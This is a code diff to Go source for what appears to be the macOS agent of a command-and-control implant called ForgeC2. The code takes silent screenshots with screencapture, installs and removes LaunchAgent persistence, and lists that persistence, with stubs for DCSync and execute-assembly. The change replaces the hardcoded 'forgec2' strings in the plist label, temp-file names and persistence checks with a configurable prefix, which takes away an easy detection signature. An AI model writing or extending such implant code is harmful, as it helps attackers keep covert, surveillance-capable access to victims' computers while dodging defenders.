@@ -31,7 +31,7 @@ func setDPIAware() {
 }
 
 func captureScreenRGBA() (*image.RGBA, error) {
-	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("forgec2_screen_%d.png", time.Now().UnixNano()))
+	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("%s_screen_%d.png", persistencePrefix, time.Now().UnixNano()))
 	defer os.Remove(tmpFile)
 
 	cmd := exec.Command("screencapture", "-x", tmpFile)
@@ -94,7 +94,7 @@ func addPersistenceDarwin() {
 		return
 	}
 
-	label := "com.forgec2.agent"
+	label := "com." + sanitizeLabel(persistencePrefix) + ".agent"
 	plistPath := filepath.Join(launchAgentsDir, label+".plist")
 	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -138,7 +138,7 @@ func removePersistenceDarwin() {
 		return
 	}
 
-	plistPath := filepath.Join(home, "Library", "LaunchAgents", "com.forgec2.agent.plist")
+	plistPath := filepath.Join(home, "Library", "LaunchAgents", "com."+sanitizeLabel(persistencePrefix)+".agent.plist")
 
 	// Unload via launchctl
 	guiDomain := fmt.Sprintf("gui/%d", os.Getuid())
@@ -709,12 +709,6 @@ func executeAssemblyForkRun(b64Data string) (string, error) {
 	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
 }
 
-func rportfwdCollectOutbound() []socksFrame     { return nil }
-func rportfwdHandleFrames(frames []socksFrame)  {}
-func rportfwdDial(connID uint64, target string) {}
-func rportfwdWrite(connID uint64, data []byte)  {}
-func rportfwdClose(connID uint64)               {}
-
 func kerberosDCSync(user string) (string, error) {
 	return "", fmt.Errorf("DCSync is Windows-only")
 }
@@ -1079,7 +1073,7 @@ func listPersistence() string {
 					plistPath := filepath.Join(dir, entry.Name())
 					if data, _ := os.ReadFile(plistPath); len(data) > 0 {
 						sb.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", plistPath, len(data)))
-						if strings.Contains(string(data), "forgec2") || strings.Contains(string(data), "ForgeC2") {
+						if strings.Contains(string(data), persistencePrefix) || strings.Contains(string(data), strings.ToLower(persistencePrefix)) {
 							sb.WriteString(fmt.Sprintf("    %s\n", string(data)))
 						}
 					}
